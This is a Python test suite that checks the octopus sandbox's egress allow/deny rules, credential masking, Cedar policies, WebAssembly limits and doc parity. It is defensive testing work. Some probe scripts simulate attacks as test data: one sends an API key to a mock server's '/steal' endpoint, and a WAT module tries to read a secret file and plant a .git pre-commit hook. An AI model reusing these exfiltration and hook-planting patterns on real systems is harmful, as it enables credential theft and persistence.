"""Tier 3: Pairwise Cross-Feature Combination Tests — 10 tests."""

from __future__ import annotations

import json
import os
from pathlib import Path
import sys
import unittest

from . import helpers


class TestTier3Combinations(unittest.TestCase):
    """10 pairwise feature-interaction tests."""

    def test_t3_01_allow_and_deny_egress_in_same_run(self) -> None:
        """T3 (F1+F3): Single `octopus run` permits allowlisted loopback server while blocking unlisted server."""
        octo = helpers.require_octopus_bin()
        with (
            helpers.LocalLoopbackMockServer() as allowed_srv,
            helpers.LocalLoopbackMockServer() as denied_srv,
            helpers.TempWorkspace() as ws,
        ):
            policy = ws.write_json(
                "policy.json",
                {
                    "allowed_domains": [allowed_srv.host_port],
                    "denied_domains": [denied_srv.host_port],
                    "commands": {"allow": ["python", "python3"]},
                },
            )
            script = ws.write_file(
                "dual_probe.py",
                (
                    "import json, os, sys, urllib.error, urllib.request\n"
                    "os.environ.pop('NO_PROXY', None)\n"
                    "os.environ.pop('no_proxy', None)\n"
                    "proxy = os.environ['HTTP_PROXY']\n"
                    "opener = urllib.request.build_opener(urllib.request.ProxyHandler({'http': proxy, 'https': proxy}))\n"
                    f"with opener.open({f'{allowed_srv.base_url}/ok'!r}, timeout=8) as r:\n"
                    "    assert r.status == 200\n"
                    "blocked = False\n"
                    "try:\n"
                    f"    opener.open({f'{denied_srv.base_url}/bad'!r}, timeout=8)\n"
                    "except urllib.error.HTTPError as e:\n"
                    "    blocked = (e.code == 403)\n"
                    "except Exception:\n"
                    "    blocked = True\n"
                    "print(json.dumps({'allowed_ok': True, 'denied_blocked': blocked}))\n"
                    "sys.exit(0 if blocked else 1)\n"
                ),
            )
            res = ws.run_octopus(
                ["run", "--policy", str(policy), "--", sys.executable, str(script)],
                octopus_bin=octo,
            )
            self.assertEqual(res.returncode, 0, res.combined_output)
            self.assertEqual(allowed_srv.hit_count(), 1)
            self.assertEqual(denied_srv.hit_count(), 0)

    def test_t3_02_cedar_and_json_policy_composition(self) -> None:
        """T3 (F1+F3): JSON policy paired with `examples/quickstart/policy.cedar` enforces allow/deny + fails closed on malformed Cedar."""
        cfg = helpers.get_config()
        octo = helpers.require_octopus_bin(cfg)
        cedar_path = cfg.repo_root / "examples" / "quickstart" / "policy.cedar"
        self.assertTrue(cedar_path.is_file(), f"Missing quickstart Cedar policy: {cedar_path}")

        with (
            helpers.LocalLoopbackMockServer() as allowed_srv,
            helpers.LocalLoopbackMockServer() as denied_srv,
            helpers.TempWorkspace() as ws,
        ):
            composed = ws.write_json(
                "composed.json",
                {
                    "allowed_domains": [allowed_srv.host_port],
                    "denied_domains": [denied_srv.host_port],
                    "cedar_file": str(cedar_path),
                    "commands": {"allow": ["python", "python3"]},
                },
            )
            ok_probe = ws.write_file("ok_probe.py", helpers.proxy_probe_script(f"{allowed_srv.base_url}/ok"))
            res_ok = ws.run_octopus(
                ["run", "--policy", str(composed), "--", sys.executable, str(ok_probe)],
                octopus_bin=octo,
            )
            self.assertEqual(res_ok.returncode, 0, res_ok.combined_output)
            self.assertEqual(allowed_srv.hit_count(), 1)

            bad_probe = ws.write_file("bad_probe.py", helpers.proxy_probe_script(f"{denied_srv.base_url}/deny"))
            res_bad = ws.run_octopus(
                ["run", "--policy", str(composed), "--", sys.executable, str(bad_probe)],
                octopus_bin=octo,
            )
            helpers.assert_blocked_outcome(res_bad, mock_server=denied_srv)

            # Malformed referenced cedar_file must fail closed
            broken_cedar = ws.write_file("broken.cedar", "permit (")
            bad_composed = ws.write_json(
                "bad_composed.json",
                {
                    "allowed_domains": [],
                    "commands": {"allow": ["python", "python3"]},
                    "cedar_file": str(broken_cedar),
                },
            )
            res_mal = ws.run_octopus(
                ["run", "--policy", str(bad_composed), "--", sys.executable, "-c", "print('NO')"],
                octopus_bin=octo,
            )
            self.assertNotEqual(res_mal.returncode, 0)
            self.assertNotIn("NO", res_mal.stdout)

    def test_t3_03_credential_masking_approved_vs_unapproved_host(self) -> None:
        """T3 (F1+F2): Masked env secret shows `ao_mask_` in child and is blocked from unapproved exfiltration."""
        octo = helpers.require_octopus_bin()
        secret_value = "sk-octopus-test-canary-9876543210"
        with (
            helpers.LocalLoopbackMockServer() as allowed_srv,
            helpers.LocalLoopbackMockServer() as denied_srv,
            helpers.TempWorkspace() as ws,
        ):
            policy = ws.write_json(
                "policy.json",
                {
                    "allowed_domains": [allowed_srv.host_port],
                    "denied_domains": [denied_srv.host_port],
                    "commands": {"allow": ["python", "python3"]},
                    "credentials": {
                        "mask_env": ["OPENAI_API_KEY"],
                        "inject_hosts": [allowed_srv.host_port],
                        "allow_plaintext_inject": True,
                    },
                },
            )
            script = ws.write_file(
                "cred_check.py",
                (
                    "import json, os, sys, urllib.error, urllib.request\n"
                    "os.environ.pop('NO_PROXY', None)\n"
                    "os.environ.pop('no_proxy', None)\n"
                    "val = os.environ.get('OPENAI_API_KEY', '')\n"
                    "assert val.startswith('ao_mask_'), f'Expected ao_mask_ prefix, got {val!r}'\n"
                    f"assert {secret_value!r} not in val, 'Raw secret leaked into child env'\n"
                    "proxy = os.environ['HTTP_PROXY']\n"
                    "opener = urllib.request.build_opener(urllib.request.ProxyHandler({'http': proxy, 'https': proxy}))\n"
                    f"req_ok = urllib.request.Request({f'{allowed_srv.base_url}/echo'!r}, headers={{'Authorization': f'Bearer {{val}}'}})\n"
                    "with opener.open(req_ok, timeout=8) as r:\n"
                    "    assert r.status == 200\n"
                    "blocked = False\n"
                    "try:\n"
                    f"    req_bad = urllib.request.Request({f'{denied_srv.base_url}/steal'!r}, headers={{'Authorization': f'Bearer {{val}}'}})\n"
                    "    opener.open(req_bad, timeout=8)\n"
                    "except Exception:\n"
                    "    blocked = True\n"
                    "print(json.dumps({'masked': True, 'exfil_blocked': blocked}))\n"
                    "sys.exit(0 if blocked else 1)\n"
                ),
            )
            env = helpers.default_clean_env({"OPENAI_API_KEY": secret_value})
            res = ws.run_octopus(
                ["run", "--policy", str(policy), "--", sys.executable, str(script)],
                octopus_bin=octo,
                env=env,
            )
            self.assertEqual(res.returncode, 0, res.combined_output)
            self.assertEqual(allowed_srv.hit_count(), 1)
            self.assertEqual(denied_srv.hit_count(), 0)
            self.assertNotIn(secret_value, res.stdout)
            self.assertNotIn(secret_value, res.stderr)
            hit_headers = {k.lower(): v for k, v in allowed_srv.hits[0].headers.items()}
            self.assertEqual(
                hit_headers.get("authorization"),
                f"Bearer {secret_value}",
                f"Expected unmasked Authorization header on approved host, got: {hit_headers}",
            )

    def test_t3_04_octopus_run_rl_off_vs_poisoned_identical_verdicts(self) -> None:
        """T3 (F1+F2): `octopus run` yields identical allow/deny results across RL-off and both poisoned Q-tables."""
        octo = helpers.require_octopus_bin()
        with (
            helpers.LocalLoopbackMockServer() as allowed_srv,
            helpers.LocalLoopbackMockServer() as denied_srv,
            helpers.TempWorkspace() as ws,
        ):
            policy = ws.write_json(
                "policy.json",
                {
                    "allowed_domains": [allowed_srv.host_port],
                    "denied_domains": [denied_srv.host_port],
                    "commands": {"allow": ["python", "python3"]},
                },
            )
            ok_py = ws.write_file("ok.py", helpers.proxy_probe_script(f"{allowed_srv.base_url}/ok"))
            bad_py = ws.write_file("bad.py", helpers.proxy_probe_script(f"{denied_srv.base_url}/bad"))

            scenarios = [
                ("default_off", None, helpers.default_clean_env()),
                ("poisoned_hard", "HardMitigation", helpers.default_clean_env({"OCTOPUS_ENABLE_RL_ADVISORY": "1"})),
                ("poisoned_passive", "PassiveObserve", helpers.default_clean_env({"OCTOPUS_ENABLE_RL_ADVISORY": "1"})),
            ]
            for label, bias, env in scenarios:
                allowed_srv.clear_hits()
                denied_srv.clear_hits()
                if bias is not None:
                    ws.write_poisoned_rl_policy(bias=bias)
                r_ok = ws.run_octopus(
                    ["run", "--policy", str(policy), "--cwd", str(ws.path), "--", sys.executable, str(ok_py)],
                    octopus_bin=octo,
                    env=env,
                )
                r_bad = ws.run_octopus(
                    ["run", "--policy", str(policy), "--cwd", str(ws.path), "--", sys.executable, str(bad_py)],
                    octopus_bin=octo,
                    env=env,
                )
                self.assertEqual(r_ok.returncode, 0, f"[{label}] allow regressed: {r_ok.combined_output}")
                self.assertEqual(allowed_srv.hit_count(), 1, f"[{label}] expected 1 hit")
                helpers.assert_blocked_outcome(r_bad, mock_server=denied_srv)

    def test_t3_05_wasm_wat_execution_and_fuel_trap_via_octopus_run(self) -> None:
        """T3 (F1+F3): `octopus run` executes benign `.wat` guest cleanly and traps fuel, forbidden WASI import, memory limit, and FS policy violations."""
        octo = helpers.require_octopus_bin()
        with helpers.TempWorkspace() as ws:
            policy = ws.write_json(
                "policy.json",
                {"allowed_domains": [], "limits": {"timeout_secs": 3, "memory_mb": 4}},
            )
            benign_wat = ws.write_file(
                "benign.wat",
                '(module (func (export "_start")))\n',
            )
            spin_wat = ws.write_file(
                "spin.wat",
                '(module (func (export "_start") (loop $spin (br $spin))))\n',
            )
            forbidden_wasi_wat = ws.write_file(
                "forbidden_wasi.wat",
                '(module (import "wasi_snapshot_preview1" "sock_accept" (func $sa (param i32 i32 i32) (result i32))) (memory (export "memory") 1) (func (export "_start")))\n',
            )
            mem_exceed_wat = ws.write_file(
                "mem_exceed.wat",
                '(module (memory (export "memory") 200) (func (export "_start")))\n',
            )
            res_ok = ws.run_octopus(
                ["run", "--policy", str(policy), "--", str(benign_wat)],
                octopus_bin=octo,
                timeout=15.0,
            )
            self.assertEqual(res_ok.returncode, 0, f"Benign .wat failed: {res_ok.combined_output}")

            res_spin = ws.run_octopus(
                ["run", "--policy", str(policy), "--timeout", "2", "--", str(spin_wat)],
                octopus_bin=octo,
                timeout=15.0,
            )
            self.assertFalse(res_spin.timed_out, "Infinite-loop .wat hung past outer timeout")
            self.assertNotEqual(res_spin.returncode, 0, "Infinite-loop .wat must trap with non-zero exit")

            res_wasi = ws.run_octopus(
                ["run", "--policy", str(policy), "--", str(forbidden_wasi_wat)],
                octopus_bin=octo,
                timeout=15.0,
            )
            self.assertNotEqual(res_wasi.returncode, 0, "Forbidden WASI sock_accept import must fail closed")
            self.assertIn("TIER1_AMBIENT_IMPORT_FORBIDDEN", res_wasi.combined_output)

            res_mem = ws.run_octopus(
                ["run", "--policy", str(policy), "--", str(mem_exceed_wat)],
                octopus_bin=octo,
                timeout=15.0,
            )
            self.assertNotEqual(res_mem.returncode, 0, "Initial memory > memory_mb must fail closed")
            self.assertIn("TIER1_WASM_MEMORY_LIMIT_EXCEEDED", res_mem.combined_output)

            # Negative & positive FS boundary via scratch_read / scratch_write
            ws.make_dir("allowed_out")
            ws.make_dir(".git/hooks")
            ws.write_file("secret.txt", "WASM_SECRET_CANARY")
            fs_policy = ws.write_json(
                "wasm_fs_policy.json",
                {
                    "allowed_domains": [],
                    "filesystem": {
                        "allow_read": [str(ws.path / "allowed_out")],
                        "allow_write": [str(ws.path / "allowed_out")],
                        "deny": ["secret.txt"],
                    },
                    "limits": {"timeout_secs": 5, "memory_mb": 16},
                },
            )
            scratch_fs_wat = ws.write_file(
                "scratch_fs.wat",
                (
                    '(module\n'
                    '  (import "octopus_wasi" "scratch_read" (func $sread (param i32 i32 i32 i32) (result i32)))\n'
                    '  (import "octopus_wasi" "scratch_write" (func $swrite (param i32 i32 i32 i32) (result i32)))\n'
                    '  (memory (export "memory") 1)\n'
                    '  (data (i32.const 0) "secret.txt")\n'
                    '  (data (i32.const 32) ".git/hooks/pre-commit")\n'
                    '  (data (i32.const 64) "allowed_out/ok.txt")\n'
                    '  (data (i32.const 96) "OK_DATA")\n'
                    '  (func (export "octopus_run") (result i32)\n'
                    '    (local $r1 i32)\n'
                    '    (local $r2 i32)\n'
                    '    (local $r3 i32)\n'
                    '    (local.set $r1 (call $sread (i32.const 0) (i32.const 10) (i32.const 256) (i32.const 64)))\n'
                    '    (local.set $r2 (call $swrite (i32.const 32) (i32.const 21) (i32.const 96) (i32.const 7)))\n'
                    '    (local.set $r3 (call $swrite (i32.const 64) (i32.const 18) (i32.const 96) (i32.const 7)))\n'
                    '    (if (i32.and (i32.eq (local.get $r1) (i32.const -5)) (i32.and (i32.eq (local.get $r2) (i32.const -5)) (i32.eq (local.get $r3) (i32.const 7))))\n'
                    '      (then (return (i32.const 0)))\n'
                    '    )\n'
                    '    (return (i32.const 1))\n'
                    '  )\n'
                    ')\n'
                ),
            )
            res_fs = ws.run_octopus(
                ["run", "--policy", str(fs_policy), "--cwd", str(ws.path), "--", str(scratch_fs_wat)],
                octopus_bin=octo,
                timeout=15.0,
            )
            self.assertEqual(res_fs.returncode, 0, f"Wasm FS boundary check failed: {res_fs.combined_output}")
            self.assertFalse((ws.path / ".git" / "hooks" / "pre-commit").exists())
            self.assertEqual((ws.path / "allowed_out" / "ok.txt").read_text(encoding="utf-8"), "OK_DATA")

    def test_t3_06_docs_quickstart_command_parity_with_real_binary(self) -> None:
        """T3 (F1+F5): Documented `README.md` quickstart command executes end-to-end with real `octopus` binary."""
        cfg = helpers.get_config()
        octo = helpers.require_octopus_bin(cfg)
        repo = cfg.repo_root
        readme = (repo / "README.md").read_text(encoding="utf-8")
        self.assertIn("examples/quickstart/policy.json", readme)
        self.assertIn("examples/quickstart/my_agent.py", readme)

        res = helpers.run_subprocess_safe(
            [
                str(octo),
                "run",
                "--policy",
                "examples/quickstart/policy.json",
                "--",
                sys.executable,
                "examples/quickstart/my_agent.py",
            ],
            cwd=repo,
            env=helpers.default_clean_env(),
            timeout=30.0,
        )
        self.assertEqual(res.returncode, 0, f"README quickstart failed: {res.combined_output}")

    def test_t3_07_hygiene_plus_sibling_immutability_plus_history(self) -> None:
        """T3 (F4+F6): Combined repo hygiene, preserved git history, and sibling immutability gate."""
        repo = helpers.get_config().repo_root
        tracked = helpers.git_ls_files(repo)
        violations = helpers.check_repo_hygiene_paths(tracked)
        self.assertEqual(violations, [], f"Repo hygiene violations in git index: {violations}")
        self.assertTrue(helpers.git_is_ancestor(repo, helpers.BASELINE_ANCESTOR_SHA, "HEAD"))
        sr_violations = helpers.validate_sibling_repo_state(
            helpers.SIBLING_SANDBOX_RUNTIME,
            expected_head_sha=helpers.BASELINE_SANDBOX_RUNTIME_SHA,
            allowed_untracked=helpers.SANDBOX_RUNTIME_ALLOWED_UNTRACKED,
            allowed_porcelain=helpers.SANDBOX_RUNTIME_ALLOWED_PORCELAIN,
        )
        self.assertEqual(sr_violations, [], "; ".join(sr_violations))
        self.assertEqual(helpers.git_status_porcelain(helpers.SIBLING_KILLSWITCH), [])

    def test_t3_08_web_api_cedar_and_governor_under_poisoned_rl(self) -> None:
        """T3 (F2+F3): Web API status, Cedar evaluation, Dogwood fail-closed, and Governor zero-attenuation under poisoned RL."""
        agent_bin = helpers.require_agent_bin()
        with helpers.TempWorkspace() as ws:
            ws.write_poisoned_rl_policy(bias="HardMitigation")
            with helpers.WebServerHandle(
                ws,
                agent_bin=agent_bin,
                extra_env={"OCTOPUS_ENABLE_RL_ADVISORY": "1"},
            ) as srv:
                c_s, status = srv.get_json("/api/status")
                self.assertEqual(c_s, 200)
                self.assertIn("rl_active_defense", status)

                c_allow, r_allow = srv.post_json(
                    "/api/evaluate-cedar",
                    {"principal": "document_arm", "action": "extract", "resource": "doc_1", "context": {}},
                )
                self.assertEqual(c_allow, 200)
                self.assertTrue(r_allow.get("is_allowed"))

                c_dog, r_dog = srv.post_json(
                    "/api/evaluate-cedar",
                    {
                        "principal": "ledger_arm",
                        "action": "write",
                        "resource": "main_ledger",
                        "context": {"amount_cents": 1000, "approved": True},
                        "attach_supervisor_approval": True,
                    },
                )
                self.assertEqual(c_dog, 200)
                self.assertFalse(r_dog.get("is_allowed"))

                c_gov, r_gov = srv.post_json(
                    "/api/governor/inject-sample",
                    {"event_type": "socket_connect", "is_malicious": True, "use_rl_mitigation": True},
                )
                self.assertEqual(c_gov, 200)
                self.assertAlmostEqual(float(r_gov["effective_epsilon_t"]), float(r_gov["raw_epsilon_t"]), places=9)

    def test_t3_09_strict_sandbox_cwd_and_timeout_combined(self) -> None:
        """T3 (F1+F3): Combining `--sandbox strict`, `--cwd <DIR>`, and `--timeout` enforces both CWD and timeout."""
        octo = helpers.require_octopus_bin()
        strict_py = helpers.find_strict_sandbox_python()
        with helpers.TempWorkspace() as ws:
            sub = ws.make_dir("strict_dir")
            policy = ws.write_json(
                "policy.json",
                {
                    "allowed_domains": [],
                    "commands": {"allow": ["python", "python3"]},
                    "filesystem": {"allow_read": [str(ws.path)], "allow_write": [str(sub)], "deny": []},
                },
            )
            ok_script = ws.write_file(
                "strict_ok.py",
                "import os; print('STRICT_CWD=' + os.path.realpath(os.getcwd()))\n",
            )
            res_ok = ws.run_octopus(
                ["run", "--policy", str(policy), "--sandbox", "strict", "--cwd", str(sub), "--timeout", "10", "--", strict_py, str(ok_script)],
                octopus_bin=octo,
            )
            self.assertEqual(res_ok.returncode, 0, res_ok.combined_output)
            self.assertIn("STRICT_CWD=", res_ok.stdout)

            hang_script = ws.write_file("strict_hang.py", "import time; time.sleep(45)\n")
            res_hang = ws.run_octopus(
                ["run", "--policy", str(policy), "--sandbox", "strict", "--cwd", str(sub), "--timeout", "1", "--", strict_py, str(hang_script)],
                octopus_bin=octo,
                timeout=30.0,
            )
            self.assertFalse(
                res_hang.timed_out,
                f"Outer test harness timed out before octopus teardown finished ({res_hang.elapsed_s:.2f}s): {res_hang.combined_output}",
            )
            self.assertLess(
                res_hang.elapsed_s,
                25.0,
                f"Expected `octopus --timeout 1` to terminate 45s sleep well before 25s (took {res_hang.elapsed_s:.2f}s)",
            )
            self.assertNotEqual(res_hang.returncode, 0)

    def test_t3_10_docs_ports_binaries_manifest_parity(self) -> None:
        """T3 (F4+F5): `Cargo.toml` binaries, `README.md`, `LICENSE-*`, and R5/R6/R7/R8 doc coverage align."""
        repo = helpers.get_config().repo_root
        self.assertTrue((repo / "LICENSE-MIT").is_file())
        self.assertTrue((repo / "LICENSE-APACHE").is_file())
        cargo_toml = (repo / "Cargo.toml").read_text(encoding="utf-8")
        for bin_name in ("octopus", "agent_octopus", "start"):
            self.assertIn(f'name = "{bin_name}"', cargo_toml)
        readme = (repo / "README.md").read_text(encoding="utf-8")
        self.assertIn("LICENSE-MIT", readme)
        self.assertIn("LICENSE-APACHE", readme)
        self.assertNotIn("127.0.0.1:5005", readme)
        self.assertIn("docs/README.md", readme)

        for rel_doc in helpers.REQUIRED_DOCS_FILES:
            self.assertTrue((repo / rel_doc).is_file(), f"Missing doc file: {rel_doc}")

        hub_text = (repo / "docs" / "README.md").read_text(encoding="utf-8")
        self.assertIn("Role-Based Reading Paths", hub_text)
        self.assertIn("Topic and Anchor Index", hub_text)

        r6_text = (repo / "docs" / "KERNEL_PATCHING_AND_ZERO_BREAKOUT_SHIELD.md").read_text(encoding="utf-8")
        for tok in (
            "canonical-livepatch",
            "kpatch",
            "ksplice",
            "UsoClient",
            "softwareupdate",
            "freebsd-update",
            "syspatch",
            "shield_locked_until_reboot",
            "telemetry_degraded_fail_closed",
        ):
            self.assertIn(tok, r6_text, f"R6 doc missing `{tok}`")

        arch_text = (repo / "docs" / "ARCHITECTURE_AND_SECURITY_MODEL.md").read_text(encoding="utf-8")
        cli_text = (repo / "docs" / "CLI_AND_POLICY_REFERENCE.md").read_text(encoding="utf-8")
        for tok in ("<2ms", "rea_binary_gate", "UnifiedSecurityShield", "LatentWorldModel"):
            self.assertIn(tok, arch_text, f"Architecture doc missing `{tok}`")
        for tok in ("binary_integrity", "--sbom", "--baseline-sbom", "--latent-weights", "sbom-guard", "latent-shield"):
            self.assertIn(tok, cli_text, f"CLI/Policy doc missing `{tok}`")
        self.assertIn("OCTOPUS_ENABLE_RL_ADVISORY=1", arch_text)
